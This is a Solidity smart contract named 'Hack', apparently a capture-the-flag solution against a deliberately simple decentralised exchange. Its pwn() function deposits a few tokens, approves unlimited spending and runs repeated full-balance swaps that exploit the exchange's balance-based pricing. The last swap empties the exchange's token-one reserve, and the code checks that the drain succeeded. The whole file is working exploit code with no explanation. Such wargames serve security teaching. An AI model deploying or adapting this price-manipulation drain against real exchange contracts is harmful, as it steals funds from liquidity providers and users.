// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Hack {
    IDex private immutable dexContract;
    IERC20 private immutable tokenOneContract;
    IERC20 private immutable tokenTwoContract;

    constructor(IDex initialDexContract) {
        dexContract = initialDexContract;
        tokenOneContract = IERC20(initialDexContract.token1());
        tokenTwoContract = IERC20(initialDexContract.token2());
    }

    function pwn() external {
        tokenOneContract.transferFrom(msg.sender, address(this), 10);
        tokenTwoContract.transferFrom(msg.sender, address(this), 10);

        tokenOneContract.approve(address(dexContract), type(uint256).max);
        tokenTwoContract.approve(address(dexContract), type(uint256).max);

        swap(tokenOneContract, tokenTwoContract);
        swap(tokenTwoContract, tokenOneContract);
        swap(tokenOneContract, tokenTwoContract);
        swap(tokenTwoContract, tokenOneContract);
        swap(tokenOneContract, tokenTwoContract);

        dexContract.swap(address(tokenTwoContract), address(tokenOneContract), 45);

        require(tokenOneContract.balanceOf(address(dexContract)) == 0, "Dex Contract's Token One balance is not equal to zero");
    }

    function swap(IERC20 tokenInContract, IERC20 tokenOutContract) private {
        dexContract.swap(address(tokenInContract), address(tokenOutContract), tokenInContract.balanceOf(address(this)));
    }
}